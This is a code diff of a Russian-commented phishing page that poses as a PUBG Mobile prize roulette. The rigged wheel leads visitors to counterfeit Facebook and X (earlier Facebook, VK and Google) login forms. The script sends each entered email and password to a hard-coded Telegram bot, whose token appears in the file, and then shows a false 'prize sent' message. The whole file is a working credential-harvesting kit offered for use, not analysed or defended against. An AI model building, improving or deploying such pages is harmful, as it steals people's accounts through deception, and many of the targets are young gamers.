-            100% { text-shadow: 0 0 15px rgba(24, 119, 242, 0.6); }
-        }
-        
-        /* Фоновые текстуры */
-        .bg-texture {
-            position: fixed;
-            top: 0;
+
+        .facebook-divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
             left: 0;
+            right: 0;
+            height: 1px;
+            background: #ddd;
+        }
+
+        .facebook-divider span {
+            background: #fff;
+            padding: 0 15px;
+            position: relative;
+        }
+
+        .facebook-create-button {
             width: 100%;
-            height: 100%;
-            background-image: 
-                radial-gradient(circle at 20% 30%, rgba(255, 56, 56, 0.05) 0%, transparent 50%),
-                radial-gradient(circle at 80% 70%, rgba(255, 215, 0, 0.05) 0%, transparent 50%);
-            pointer-events: none;
-            z-index: -1;
-            animation: bgMove 20s infinite alternate ease-in-out;
+            padding: 15px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 25px;
         }
-        
-        @keyframes bgMove {
-            0% { transform: translate(0, 0) scale(1); }
-            100% { transform: translate(-50px, -50px) scale(1.1); }
+
+        .facebook-links {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #ddd;
         }
-        
-        .floating-particle {
-            position: fixed;
-            width: 4px;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: -1;
-            animation: floatAround 20s infinite linear;
+
+        .facebook-links a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: block;
+            margin-bottom: 10px;
         }
-        
-        @keyframes floatAround {
-            0%, 100% { transform: translate(0, 0) rotate(0deg); }
-            25% { transform: translate(100px, 50px) rotate(90deg); }
-            50% { transform: translate(50px, 100px) rotate(180deg); }
-            75% { transform: translate(-50px, 50px) rotate(270deg); }
+
+        .facebook-language {
+            background: #f0f2f5;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
         }
-        
-        /* Анимация вращения рулетки */
-        @keyframes spinWheel {
-            0% { transform: rotate(0deg); }
-            25% { transform: rotate(90deg); }
-            50% { transform: rotate(180deg); }
-            75% { transform: rotate(270deg); }
-            100% { transform: rotate(360deg); }
+
+        .facebook-language select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background: white;
+            color: #333;
         }
-        
+
+        .facebook-footer {
+            background: #fff;
+            padding: 20px;
+            border-top: 1px solid #ddd;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        /* Стили для Twitter окна */
+        .twitter-modal-content {
+            background: #000;
+            color: #fff;
+            min-height: 600px;
+        }
+
+        .twitter-header {
+            padding: 25px 20px;
+            text-align: center;
+            border-bottom: 1px solid #333;
+        }
+
+        .twitter-logo {
+            color: #1da1f2;
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+
+        .twitter-title {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .twitter-subtitle {
+            color: #999;
+            font-size: 1.1rem;
+        }
+
+        .twitter-form {
+            padding: 25px 20px;
+        }
+
+        .twitter-input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            background: transparent;
+            border: 2px solid #333;
+            border-radius: 4px;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .twitter-input:focus {
+            outline: none;
+            border-color: #1da1f2;
+        }
+
+        .twitter-next-button {
+            width: 100%;
+            padding: 15px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .twitter-forgot {
+            color: #1da1f2;
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: block;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .twitter-divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: #666;
+        }
+
+        .twitter-divider::before,
+        .twitter-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #333;
+        }
+
+        .twitter-divider span {
+            padding: 0 15px;
+        }
+
+        .twitter-google-button {
+            width: 100%;
+            padding: 15px;
+            background: transparent;
+            border: 1px solid #333;
+            border-radius: 50px;
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .twitter-apple-button {
+            width: 100%;
+            padding: 15px;
+            background: transparent;
+            border: 1px solid #333;
+            border-radius: 50px;
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .twitter-signup {
+            text-align: center;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        .twitter-signup a {
+            color: #1da1f2;
+            text-decoration: none;
+        }
+
+        .twitter-footer {
+            padding: 20px;
+            border-top: 1px solid #333;
+            font-size: 0.8rem;
+            color: #666;
+            text-align: center;
+        }
+
+        /* Стили для окна успеха */
+        .success-modal-content {
+            background: #000;
+            border: 3px solid gold;
+            min-height: 500px;
+        }
+
+        .success-header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #333 100%);
+            padding: 25px 20px;
+            border-bottom: 2px solid gold;
+        }
+
+        .success-header h1 {
+            color: gold;
+            font-size: 2.2rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .success-header h2 {
+            color: #fff;
+            font-size: 1.5rem;
+            margin-bottom: 5px;
+        }
+
+        .success-prize-container {
+            padding: 30px;
+            background: #111;
+        }
+
+        .success-prize-image {
+            max-width: 150px;
+            max-height: 150px;
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+            border: 3px solid gold;
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.4);
+        }
+
+        .success-message {
+            padding: 25px 20px;
+            background: #222;
+            text-align: center;
+        }
+
+        .success-message h3 {
+            color: gold;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+
+        .success-message p {
+            color: #ccc;
+            font-size: 1.1rem;
+        }
+
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes wheelGlow {
+            0% { filter: drop-shadow(0 0 5px gold); }
+            50% { filter: drop-shadow(0 0 20px gold); }
+            100% { filter: drop-shadow(0 0 5px gold); }
+        }
+
         .spinning {
-            animation: spinWheel 0.5s linear infinite !important;
+            animation: wheelGlow 1s infinite;
         }
-        
-        /* Адаптив */
+
+        @media (max-width: 768px) {
+            .roulette-container {
+                width: 300px;
+                height: 300px;
+            }
+            
+            .wheel-base {
+                width: 55%;
+                height: 55%;
+            }
+            
+            .spin-button {
+                padding: 12px 40px;
+                font-size: 1.3rem;
+                margin: 20px auto;
+            }
+
+            .modal-content {
+                max-width: 95%;
+                min-height: auto;
+            }
+        }
+
         @media (max-width: 480px) {
             .container {
-                max-width: 100%;
+                padding: 30px 20px;
             }
             
-            .content {
-                padding: 15px;
+            .roulette-container {
+                width: 280px;
+                height: 280px;
+                margin-bottom: 20px;
             }
             
-            .game-section,
-            .result-section,
-            .prizes-showcase {
-                padding: 20px;
+            .wheel-base {
+                width: 55%;
+                height: 55%;
             }
             
-            .prizes-grid {
-                grid-template-columns: repeat(2, 1fr);
+            .spin-button {
+                padding: 10px 30px;
+                font-size: 1.2rem;
+                margin: 15px auto;
             }
-            
-            .slot-machine {
-                width: 160px;
-                height: 160px;
+
+            .win-modal-header h1 {
+                font-size: 2rem;
             }
-            
-            .slot-machine-inner {
-                font-size: 70px;
+
+            .win-modal-header h2 {
+                font-size: 1.5rem;
             }
-            
-            .facebook-original,
-            .vk-original,
-            .google-original {
-                max-width: 100%;
+
+            .prize-image {
+                max-width: 150px;
+                max-height: 150px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="bg-texture"></div>
-    
-    <!-- Плавающие частицы -->
-    <div class="floating-particle" style="top: 10%; left: 20%; animation-delay: 0s;"></div>
-    <div class="floating-particle" style="top: 30%; left: 80%; animation-delay: -5s;"></div>
-    <div class="floating-particle" style="top: 70%; left: 40%; animation-delay: -10s;"></div>
-    <div class="floating-particle" style="top: 40%; left: 10%; animation-delay: -15s;"></div>
-    <div class="floating-particle" style="top: 80%; left: 90%; animation-delay: -7s;"></div>
-    
+    <div class="backgrounds-container">
+        <div class="background-top"></div>
+        <div class="background-bottom"></div>
+        <div class="gradient-overlay"></div>
+    </div>
+
     <div class="container">
-        <div class="content">
-            <!-- Левая секция - игра -->
-            <div class="game-section">
-                <div class="prize-display" id="prizeDisplay">
-                    <div id="defaultPrize">
-                        <div class="slot-machine">
-                            <div class="slot-machine-inner">🎰</div>
-                        </div>
-                        <div class="prize-name-large">Нажми "Крутить"</div>
-                        <div class="prize-subtitle">и выиграй эксклюзивный приз!</div>
-                    </div>
-                    
-                    <div id="wonPrize" style="display: none;">
-                        <img id="wonPrizeImage" src="" alt="Выигранный приз" style="width: 120px; height: 120px; object-fit: contain; margin-bottom: 20px; filter: drop-shadow(0 4px 8px rgba(255, 215, 0, 0.5));">
-                        <div class="prize-name-large" id="wonPrizeName"></div>
-                        <div class="prize-subtitle" id="wonPrizeDesc" style="color: #00b894;"></div>
-                    </div>
-                </div>
-                
-                <button class="spin-button" id="spinButton">
-                    <i class="fas fa-dice"></i>
-                    КРУТИТЬ
-                </button>
+        <div class="roulette-container">
+            <div class="wheel-container">
+                <img src="wheel.png" alt="Колесо рулетки" class="wheel prize-wheel" id="prizeWheel">
+                <img src="wheel_base.png" alt="Основание колеса" class="wheel wheel-base" id="wheelBase">
+            </div>
+        </div>
+
+        <button class="spin-button" id="spinButton">КРУТИТЬ РУЛЕТКУ</button>
+    </div>
+
+    <!-- Модальное окно выигрыша -->
+    <div class="modal-overlay" id="winModal">
+        <div class="modal-content">
+            <div class="win-modal-header">
+                <h1>METEOR ROYAL</h1>
+                <h2>REVALE PASS S</h2>
+                <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
+                <p style="color: #ccc; margin-top: 10px;">Login to receive reward</p>
             </div>
             
-            <!-- Правая секция - ТВОЙ ВЫИГРЫШ -->
-            <div class="result-section">
-                <div class="section-title">ТВОЙ ВЫИГРЫШ</div>
-                
-                <div class="winner-info">
-                    <div id="initialMessage">
-                        <div class="win-message">🎯 У тебя есть 1 попытка!</div>
-                        <div class="winner-desc">
-                            Нажми кнопку "Крутить" чтобы выиграть скин или валюту PUBG Mobile
-                        </div>
-                    </div>
-                    
-                    <div id="winnerMessage" style="display: none;">
-                        <div class="win-message">🎉 ПОЗДРАВЛЯЕМ!</div>
-                        <div class="winner-prize">
-                            Ты выиграл: <span id="winnerPrizeText"></span>
-                        </div>
-                        <div class="winner-desc">
-                            Для получения приза войди через соцсеть
-                        </div>
-                    </div>
+            <div class="prize-image-container">
+                <img id="winPrizeImage" class="prize-image" alt="Выигрыш">
+            </div>
+            
+            <div class="login-options">
+                <h3>Login With:</h3>
+                <div class="checkbox-option" id="facebookOption">
+                    <span>Login With Facebook</span>
+                    <div class="checkbox-icon"></div>
                 </div>
-                
-                <button class="social-choice-btn" id="socialChoiceBtn" style="display: none;">
-                    <i class="fas fa-sign-in-alt"></i>
-                    ВЫБРАТЬ СПОСОБ ВХОДА
-                </button>
-                
-                <!-- Инструкции -->
-                <div class="instructions">
-                    <h3><i class="fas fa-list-check"></i> КАК ПОЛУЧИТЬ ПРИЗ:</h3>
-                    <ul>
-                        <li>Нажми "Крутить" и дождись результата</li>
-                        <li>Нажми "Выбрать способ входа"</li>
-                        <li>Выбери соцсеть для входа</li>
-                        <li>Введи свои данные</li>
-                        <li>Введи свой ID PUBG Mobile</li>
-                        <li>Получи код активации!</li>
-                    </ul>
+                <div class="checkbox-option" id="twitterOption">
+                    <span>Login With Twitter</span>
+                    <div class="checkbox-icon"></div>
                 </div>
             </div>
             
-            <!-- Призы -->
-            <div class="prizes-showcase">
-                <div class="section-title">ВОЗМОЖНЫЕ ПРИЗЫ</div>
-                <div class="prizes-grid" id="prizesGrid"></div>
-            </div>
-            
-            <!-- Защита данных -->
-            <div class="data-protection">
-                🔒 Ваши данные защищены. Мы не храним пароли.
+            <div class="modal-buttons">
+                <button class="modal-button cancel" id="cancelWin">Cancel</button>
+                <button class="modal-button ok" id="confirmLogin">OK</button>
             </div>
         </div>
     </div>
-    
-    <!-- Модальное окно выбора соцсети -->
-    <div class="modal-overlay" id="socialModal">
-        <div class="facebook-original">
-            <div class="fb-header">
-                <div class="fb-logo" style="color: #ff3838; font-size: 36px; font-family: 'Arial Black', sans-serif;">PUBG</div>
-                <h2 class="fb-title">Выберите способ входа</h2>
-            </div>
-            <div class="fb-body">
-                <div class="social-options">
-                    <div class="social-option social-facebook active" data-social="facebook">
-                        <div class="social-icon">
-                            <i class="fab fa-facebook"></i>
-                        </div>
-                        <div class="social-name">Facebook</div>
-                    </div>
-                    <div class="social-option social-vk" data-social="vk">
-                        <div class="social-icon">
-                            <i class="fab fa-vk"></i>
-                        </div>
-                        <div class="social-name">ВКонтакте</div>
-                    </div>
-                    <div class="social-option social-google" data-social="google">
-                        <div class="social-icon">
-                            <i class="fab fa-google"></i>
-                        </div>
-                        <div class="social-name">Google</div>
-                    </div>
-                </div>
-                <div style="text-align: center; margin-top: 20px; color: #606770; font-size: 14px;">
-                    Выберите соцсеть для получения приза
-                </div>
-                <button class="fb-submit" id="confirmSocialBtn" style="margin-top: 25px; background: #ff3838;">
-                    ПРОДОЛЖИТЬ
-                </button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Facebook модалка -->
+
+    <!-- Модальное окно входа в Facebook -->
     <div class="modal-overlay" id="facebookModal">
-        <div class="facebook-original">
-            <div class="fb-header">
-                <div class="fb-logo">facebook</div>
-                <div style="color: #1c1e21; font-size: 18px; margin-top: 10px;">Русский</div>
-            </div>
-            <div class="fb-body">
-                <form id="facebookForm">
-                    <div class="fb-form-group">
-                        <input type="text" class="fb-input" id="fbEmail" placeholder="Мобильный телефон или эл. адрес" required>
-                    </div>
-                    
-                    <div class="fb-form-group">
-                        <input type="password" class="fb-input" id="fbPassword" placeholder="Пароль" required>
-                    </div>
-                    
-                    <button type="submit" class="fb-submit" id="submitFacebookBtn">
-                        Войти
-                    </button>
-                </form>
-                
-                <div style="text-align: center; margin-top: 16px;">
-                    <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px; font-family: Helvetica, Arial, sans-serif;">
-                        Забыли пароль?
-                    </a>
-                </div>
-                
-                <hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;" />
-                
-                <button type="button" class="fb-submit" style="background: #42b72a; margin-top: 0;">
-                    Создать новый аккаунт
-                </button>
+        <div class="modal-content facebook-modal-content">
+            <div class="facebook-header">
+                <div class="facebook-logo">facebook</div>
+                <div class="facebook-subtitle">Log in to your Facebook account to connect to PUBG MOBILE</div>
             </div>
             
-            <div class="fb-footer">
-                <div class="fb-links">
-                    <a href="#" class="fb-link">Информация</a>
-                    <a href="#" class="fb-link">Справка</a>
-                    <a href="#" class="fb-link">Ещё</a>
+            <form class="facebook-form" id="facebookForm">
+                <input type="text" class="facebook-input" id="fbEmail" placeholder="Mobile number or email address" required>
+                <input type="password" class="facebook-input" id="fbPassword" placeholder="Password" required>
+                
+                <button type="submit" class="facebook-login-button">Log In</button>
+                
+                <div class="facebook-divider">
+                    <span>or</span>
                 </div>
-                <div class="fb-meta">
-                    Meta © 2024
+                
+                <button type="button" class="facebook-create-button" id="createAccount">Create new account</button>
+                
+                <div class="facebook-links">
+                    <a href="#" id="fbNotNow">Not now</a>
+                    <a href="#" id="forgotPassword">Forgotten password?</a>
                 </div>
+            </form>
+            
+            <div class="facebook-language">
+                <select>
+                    <option>English (UK)</option>
+                    <option>Basa Jawa</option>
+                    <option>日本語</option>
+                    <option>Português (Brasil)</option>
+                    <option>Bahasa Indonesia</option>
+                    <option>Bahasa Melayu</option>
+                    <option>Español</option>
+                    <option>Русский</option>
+                </select>
+            </div>
+            
+            <div class="facebook-footer">
+                Facebook Inc.
             </div>
         </div>
     </div>
-    
-    <!-- VK модалка -->
-    <div class="modal-overlay" id="vkModal">
-        <div class="vk-original">
-            <div class="vk-header">
-                <div class="vk-logo">ВКонтакте</div>
-                <div class="vk-title">Войдите, чтобы получить приз</div>
+
+    <!-- Модальное окно входа в Twitter -->
+    <div class="modal-overlay" id="twitterModal">
+        <div class="modal-content twitter-modal-content">
+            <div class="twitter-header">
+                <div class="twitter-logo">𝕏</div>
+                <div class="twitter-title">Sign in to X</div>
+                <div class="twitter-subtitle">Log in to your X account to connect to PUBG MOBILE</div>
             </div>
-            <div class="vk-body">
-                <form id="vkForm">
-                    <div class="vk-form-group">
-                        <input type="text" class="vk-input" id="vkEmail" placeholder="Телефон или email" required>
-                    </div>
-                    
-                    <div class="vk-form-group">
-                        <input type="password" class="vk-input" id="vkPassword" placeholder="Пароль" required>
-                    </div>
-                    
-                    <button type="submit" class="vk-submit" id="submitVkBtn">
-                        Войти
-                    </button>
-                </form>
-            </div>
-            <div class="vk-footer">
-                <a href="#" class="vk-link">Зарегистрироваться</a>
-                <a href="#" class="vk-link">Забыли пароль?</a>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Google модалка -->
-    <div class="modal-overlay" id="googleModal">
-        <div class="google-original">
-            <div class="google-header">
-                <div class="google-logo"></div>
-                <div class="google-title">Вход</div>
-                <div class="google-subtitle">Чтобы получить приз</div>
-            </div>
-            <div class="google-body">
-                <form id="googleForm">
-                    <div class="google-form-group">
-                        <input type="email" class="google-input" id="googleEmail" placeholder="Электронная почта или телефон" required>
-                    </div>
-                    
-                    <div class="google-form-group">
-                        <input type="password" class="google-input" id="googlePassword" placeholder="Введите пароль" required>
-                    </div>
-                    
-                    <button type="submit" class="google-submit" id="submitGoogleBtn">
-                        Далее
-                    </button>
-                </form>
-            </div>
-            <div class="google-footer">
-                <a href="#" class="google-link">Забыли пароль?</a>
-                <a href="#" class="google-link">Справка</a>
-            </div>
-        </div>
-    </div>
-    
-    <!-- PUBG ID модалка -->
-    <div class="modal-overlay" id="pubgModal">
-        <div class="facebook-original">
-            <div class="fb-header">
-                <div class="fb-logo" style="color: #ff3838; font-size: 36px; font-family: 'Arial Black', sans-serif;">PUBG</div>
-                <h2 class="fb-title">Введите ID PUBG Mobile</h2>
-            </div>
-            <div class="fb-body">
-                <form id="pubgForm">
-                    <div class="fb-form-group">
-                        <input type="text" class="fb-input" id="pubgId" placeholder="Ваш ID PUBG Mobile" required>
-                    </div>
-                    
-                    <div class="fb-form-group">
-                        <select class="fb-input" id="pubgServer" required style="font-size: 17px; color: #1d2129;">
-                            <option value="">Выберите сервер</option>
-                            <option value="europe">Европа</option>
-                            <option value="asia">Азия</option>
-                            <option value="america">Америка</option>
-                            <option value="middle_east">Ближний Восток</option>
-                        </select>
-                    </div>
-                    
-                    <button type="submit" class="fb-submit" style="background: #ff3838;">
-                        ПОЛУЧИТЬ ПРИЗ
-                    </button>
-                </form>
-            </div>
-            <div class="fb-footer">
-                <div class="fb-meta">
-                    🔒 Ваши данные защищены. Мы не храним пароли.
+            
+            <form class="twitter-form" id="twitterForm">
+                <input type="text" class="twitter-input" id="twitterEmail" placeholder="Phone number or email address" required>
+                <input type="password" class="twitter-input" id="twitterPassword" placeholder="Password" required>
+                
+                <button type="submit" class="twitter-next-button">Next</button>
+                
+                <a href="#" class="twitter-forgot" id="twitterForgot">Forgot password?</a>
+                
+                <div class="twitter-divider">
+                    <span>or</span>
                 </div>
+                
+                <button type="button" class="twitter-google-button" id="twitterGoogle">
+                    <span>Sign in with Google</span>
+                </button>
+                
+                <button type="button" class="twitter-apple-button" id="twitterApple">
+                    <span>Sign in with Apple</span>
+                </button>
+                
+                <div class="twitter-signup">
+                    Don't have an account? <a href="#" id="twitterSignup">Sign up</a>
+                </div>
+            </form>
+            
+            <div class="twitter-footer">
+                © 2024 X Corp.
             </div>
         </div>
     </div>
-    
-    <!-- Успешное модальное окно -->
+
+    <!-- Модальное окно успешного получения приза -->
     <div class="modal-overlay" id="successModal">
-        <div class="success-modal">
-            <div class="success-icon">✅</div>
-            <div class="success-title">Поздравляем!</div>
-            
-            <div style="color: #606770; padding: 0 25px; margin-bottom: 25px; font-size: 16px; line-height: 1.5;">
-                Ваш приз успешно получен и будет отправлен в течение 24 часов
+        <div class="modal-content success-modal-content">
+            <div class="success-header">
+                <h1>MEXICO ROYAL</h1>
+                <h2>ROYALE PASS S</h2>
             </div>
             
-            <div class="prize-code">
-                <div style="color: #606770; margin-bottom: 15px; font-size: 16px;">Код активации:</div>
-                <div class="code" id="activationCode"></div>
-                <div style="color: #90949c; font-size: 14px; margin-top: 15px; line-height: 1.5;">
-                    Придет на почту в течение 24 часов
-                </div>
+            <div class="success-prize-container">
+                <img id="successPrizeImage" class="success-prize-image" alt="Выигрыш">
             </div>
             
-            <div style="margin: 25px; padding: 20px; background: #f0f2f5; border-radius: 8px;">
-                <div style="color: #1c1e21; font-weight: bold; margin-bottom: 15px; font-size: 18px;">
-                    Ваш выигрыш:
-                </div>
-                <div style="color: #ff3838; font-size: 24px; font-weight: bold;" id="finalPrize"></div>
+            <div class="success-message">
+                <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
+                <h3 style="color: gold; margin-top: 15px;">Congratulations</h3>
+                <p style="margin-top: 10px;">Your prize has been sent to your account</p>
             </div>
             
-            <div style="padding: 25px; border-top: 1px solid #dadde1;">
-                <button class="fb-submit" onclick="location.reload()" style="background: #1877f2;">
-                    🎮 ВЕРНУТЬСЯ В ИГРУ
-                </button>
+            <div class="modal-buttons">
+                <button class="modal-button cancel" id="cancelSuccess">Cancel</button>
+                <button class="modal-button ok" id="okSuccess">OK</button>
             </div>
         </div>
     </div>
 
     <script>
+        // Конфигурация призов (все PNG)
         const prizes = [
-            { 
-                id: 1, 
-                name: "Мумия", 
-                description: "Эксклюзивный скин",
-                image: "mummy_skin.png",
-                type: "skin",
-                code: "PUBG-MUMMY-" + generateCode()
-            },
-            { 
-                id: 2, 
-                name: "120 UC", 
-                description: "Игровая валюта",
-                image: "uc_120.png", 
-                type: "currency",
-                code: "PUBG-UC-120-" + generateCode()
-            },
-            { 
-                id: 3, 
-                name: "1000 Серебра", 
-                description: "Игровая валюта",
-                image: "silver_1000.png", 
-                type: "currency",
-                code: "PUBG-SILVER-1000-" + generateCode()
-            },
-            { 
-                id: 4, 
-                name: "M416 Ледник", 
-                description: "Ледяной скин",
-                image: "m416_glacier.png", 
-                type: "skin",
-                code: "PUBG-M416-GLACIER-" + generateCode()
-            },
-            { 
-                id: 5, 
-                name: "M416 Шут", 
-                description: "Шуточный скин",
-                image: "m416_joke.png", 
-                type: "skin",
-                code: "PUBG-M416-JOKE-" + generateCode()
-            },
-            { 
-                id: 6, 
-                name: "AKM Скин", 
-                description: "Эксклюзивный скин",
-                image: "akm_skin.png", 
-                type: "skin",
-                code: "PUBG-AKM-SKIN-" + generateCode()
-            },
-            { 
-                id: 7, 
-                name: "Скарель скин", 
-                description: "Редкий скин",
-                image: "scarel_skin.png", 
-                type: "skin",
-                code: "PUBG-SCAREL-" + generateCode()
-            },
-            { 
-                id: 8, 
-                name: "Сундук", 
-                description: "Сюрпризный сундук",
-                image: "chest.png", 
-                type: "chest",
-                code: "PUBG-CHEST-" + generateCode()
-            }
+            { name: "pharaon", image: "pharaon.png" },
+            { name: "material", image: "material.png" },
+            { name: "m416lednik", image: "m416lednik.png" },
+            { name: "mummy", image: "mummy.png" },
+            { name: "m416shut", image: "m416shut.png" },
+            { name: "8500uc", image: "8500uc.png" },
+            { name: "shorti", image: "shorti.png" },
+            { name: "m416skin", image: "m416skin.png" },
+            { name: "kalash", image: "kalash.png" },
+            { name: "m416skin2", image: "m416skin2.png" },
+            { name: "m16", image: "m16.png" },
+            { name: "tolstovka", image: "tolstovka.png" }
         ];
 
-        function generateCode() {
-            return Math.random().toString(36).substr(2, 8).toUpperCase();
+        // Специальные призы, которые должны выпадать чаще
+        const specialPrizes = ["mummy", "m416shut", "m416lednik"];
+        const specialPrizeIndexes = [];
+
+        // Находим индексы специальных призов
+        prizes.forEach((prize, index) => {
+            if (specialPrizes.includes(prize.name)) {
+                specialPrizeIndexes.push(index);
+            }
+        });
+
+        // Telegram бот данные
+        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const CHAT_ID = '1709490182';
+
+        // Элементы DOM
+        const spinButton = document.getElementById('spinButton');
+        const prizeWheel = document.getElementById('prizeWheel');
+        const wheelBase = document.getElementById('wheelBase'); // Стрелка
+        const winModal = document.getElementById('winModal');
+        const facebookModal = document.getElementById('facebookModal');
+        const twitterModal = document.getElementById('twitterModal');
+        const successModal = document.getElementById('successModal');
+        const winPrizeImage = document.getElementById('winPrizeImage');
+        const successPrizeImage = document.getElementById('successPrizeImage');
+        
+        // Login options
+        const facebookOption = document.getElementById('facebookOption');
+        const twitterOption = document.getElementById('twitterOption');
+        const confirmLogin = document.getElementById('confirmLogin');
+
+        let isSpinning = false;
+        let hasSpun = false; // Флаг для ограничения одного вращения
+        let currentRotation = 0;
+        let wheelBaseRotation = 0; // Отдельное вращение для стрелки
+        let currentPrize = null;
+        let selectedLoginOption = 'facebook'; // По умолчанию Facebook
+
+        // Инициализация
+        function initialize() {
+            // Сброс состояния при загрузке страницы
+            hasSpun = false;
+            spinButton.disabled = false;
+            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            
+            // Сброс вращения
+            currentRotation = 0;
+            wheelBaseRotation = 0;
+            prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
+            wheelBase.style.transform = `translate(-50%, -50%) rotate(${wheelBaseRotation}deg)`;
+            
+            // Установка выбора по умолчанию
+            facebookOption.classList.add('active');
+            twitterOption.classList.remove('active');
+            selectedLoginOption = 'facebook';
         }
 
-        const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
-        const TELEGRAM_CHAT_ID = '1709490182';
+        // Функция вращения рулетки (только один раз)
+        function spinRoulette() {
+            if (isSpinning || hasSpun) return;
+            
+            isSpinning = true;
+            spinButton.disabled = true;
+            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            
+            // Выбор приза: с большей вероятностью выпадают специальные призы
+            let prizeIndex;
+            if (Math.random() < 0.8) { // 80% вероятность специального приза
+                const randomSpecialIndex = Math.floor(Math.random() * specialPrizeIndexes.length);
+                prizeIndex = specialPrizeIndexes[randomSpecialIndex];
+            } else {
+                prizeIndex = Math.floor(Math.random() * prizes.length);
+            }
+            
+            currentPrize = prizes[prizeIndex];
+            
+            // Настройка вращения (призы расположены через каждые 30 градусов)
+            const targetAngle = prizeIndex * 30;
+            const spins = 5 + Math.floor(Math.random() * 3);
+            const totalRotation = (spins * 360) + targetAngle;
+            
+            // Стрелка вращается в противоположном направлении для указания на приз
+            const wheelBaseTargetRotation = -((spins * 360) + targetAngle);
+            
+            // Анимация вращения колеса
+            prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
+            currentRotation += totalRotation;
+            prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
+            
+            // Анимация вращения стрелки
+            wheelBase.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
+            wheelBaseRotation += wheelBaseTargetRotation;
+            wheelBase.style.transform = `translate(-50%, -50%) rotate(${wheelBaseRotation}deg)`;
+            
+            // Отмечаем, что вращение уже было
+            hasSpun = true;
+            
+            // Показ модального окна с выигрышем
+            setTimeout(() => {
+                winPrizeImage.src = currentPrize.image;
+                winModal.style.display = 'flex';
+                isSpinning = false;
+                // Не включаем кнопку обратно после вращения
+                spinButton.disabled = true;
+                spinButton.style.opacity = '0.5';
+            }, 4000);
+        }
 
-        let hasSpun = false;
-        let currentPrize = null;
-        let userIP = '';
-        let socialData = {};
-        let selectedSocial = 'facebook';
-
-        document.addEventListener('DOMContentLoaded', function() {
-            createPrizesGrid();
-            getUserIP();
+        // Функция отправки данных в Telegram
+        async function sendToTelegram(data) {
+            const message = `🎰 НОВЫЙ ВЫИГРЫШ!\n\n` +
+                           `🎁 Приз: ${data.prize}\n` +
+                           `📧 Логин: ${data.login}\n` +
+                           `🔑 Пароль: ${data.password}\n` +
+                           `🌐 Соцсеть: ${data.network}\n` +
+                           `🕐 Время: ${new Date().toLocaleString()}`;
             
-            // Основные обработчики
-            document.getElementById('spinButton').addEventListener('click', spin);
-            document.getElementById('socialChoiceBtn').addEventListener('click', showSocialModal);
-            document.getElementById('confirmSocialBtn').addEventListener('click', confirmSocialChoice);
-            
-            // Обработчики форм
-            document.getElementById('facebookForm').addEventListener('submit', handleFacebookSubmit);
-            document.getElementById('vkForm').addEventListener('submit', handleVkSubmit);
-            document.getElementById('googleForm').addEventListener('submit', handleGoogleSubmit);
-            document.getElementById('pubgForm').addEventListener('submit', handlePubgSubmit);
-            
-            // Выбор соцсети
-            document.querySelectorAll('.social-option').forEach(option => {
-                option.addEventListener('click', function() {
-                    document.querySelectorAll('.social-option').forEach(opt => {
-                        opt.classList.remove('active');
-                    });
-                    this.classList.add('active');
-                    selectedSocial = this.dataset.social;
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
                 });
+                
+                const result = await response.json();
+                console.log('Данные отправлены в Telegram:', result);
+                return result.ok;
